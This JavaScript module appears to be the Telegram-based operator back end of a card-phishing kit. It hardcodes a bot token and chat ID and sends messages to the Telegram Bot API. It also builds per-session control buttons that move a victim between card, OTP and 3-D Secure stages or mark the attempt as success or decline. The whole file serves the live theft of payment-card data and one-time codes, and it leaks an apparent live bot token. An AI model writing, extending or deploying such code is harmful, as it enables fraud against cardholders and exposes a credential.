// Telegram config
export const BOT_TOKEN = '5782049749:AAGP1ULW3f2MbYNUfI6Q3sof9hY1Hrcp4ko';
export const CHAT_ID = '-5120286446';

/**
 * @param {string} message
 * @param {object} [replyMarkup]
 */
export async function sendTelegram(message, replyMarkup) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  };
  if (replyMarkup) payload.reply_markup = replyMarkup;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!r.ok) {
      const t = await r.text().catch(() => '');
      console.error('[telegram] sendMessage failed', r.status, t);
    }
  } catch (e) {
    console.error('[telegram] fetch error', e);
  }
}

/**
 * Build inline keyboard for admin control.
 * Always uses callback_data so clicks are instant (no browser tab opens).
 * Requires the Telegram webhook to be set to /api/tg-hook.
 * @param {string} sessionId
 * @param {string} _baseUrl  (kept for backward compat, unused)
 * @param {'card'|'otp'|'3ds'} stage
 */
export function buildKeyboard(sessionId, _baseUrl, stage = 'card') {
  const btn = (text, a) => ({ text, callback_data: `${a}:${sessionId}` });

  if (stage === 'card') {
    return {
      inline_keyboard: [
        [btn('🔑 OTP', 'otp'), btn('🔗 3D Secure', '3ds')],
        [btn('✅ Success', 'success'), btn('❌ Decline', 'decline')]
      ]
    };
  }
  if (stage === 'otp') {
    return {
      inline_keyboard: [
        [btn('❌ Wrong Code', 'decline'), btn('🔗 → 3D Secure', '3ds')],
        [btn('✅ Success', 'success')]
      ]
    };
  }
  return {
    inline_keyboard: [
      [btn('❌ Wrong Link', 'decline'), btn('🔑 → OTP', 'otp')],
      [btn('✅ Success', 'success')]
    ]
  };
}
